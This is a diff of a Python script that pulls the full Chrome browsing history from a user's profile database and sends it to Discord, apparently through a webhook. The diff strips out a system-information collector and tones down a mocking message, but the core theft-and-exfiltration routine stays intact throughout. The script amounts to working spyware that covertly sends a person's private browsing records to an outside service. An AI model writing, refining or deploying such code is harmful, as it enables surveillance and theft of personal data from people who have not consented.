@@ -21,13 +21,13 @@ def get_chrome_history():
         chrome_history_path = os.path.expanduser("~/.config/google-chrome/Default/History")
 
     if not os.path.exists(chrome_history_path):
-        return "This dude is not a gooner"  # If history file doesn't exist, return this message
+        return "Chrome history file not found."
 
     # Open the Chrome history SQLite file
     conn = sqlite3.connect(chrome_history_path)
     cursor = conn.cursor()
 
-    # Query all browsing history (URLs and visit times)
+    # Query the browsing history (URLs and visit times)
     cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC")
     history = cursor.fetchall()
     conn.close()
@@ -54,16 +54,6 @@ def get_chrome_history():
 
     return formatted_history if formatted_history else "No browsing history found."
 
-# Function to gather basic PC system information
-def get_system_info():
-    system_info = "**🖥️ System Information**\n\n"
-
-    # Get basic PC info (OS, architecture, etc.)
-    system_info += f"• **OS:** {platform.system()} {platform.release()}\n"
-    system_info += f"• **Architecture:** {platform.architecture()[0]}\n"
-
-    return system_info
-
 # Send the info to Discord
 def send_to_discord(message):
     data = {
@@ -75,14 +65,9 @@ def send_to_discord(message):
 # Main function
 if __name__ == "__main__":
     history_info = get_chrome_history()
-    system_info = get_system_info()
-    
-    # Combine both the history and system information
-    message = f"{history_info}\n\n{system_info}"
-    
     if history_info:
-        response = send_to_discord(message)
+        response = send_to_discord(history_info)
         if response.status_code == 204:
-            print("History and system info successfully sent to Discord!")
+            print("History successfully sent to Discord!")
         else:
             print(f"Failed to send info. Status code: {response.status_code}")
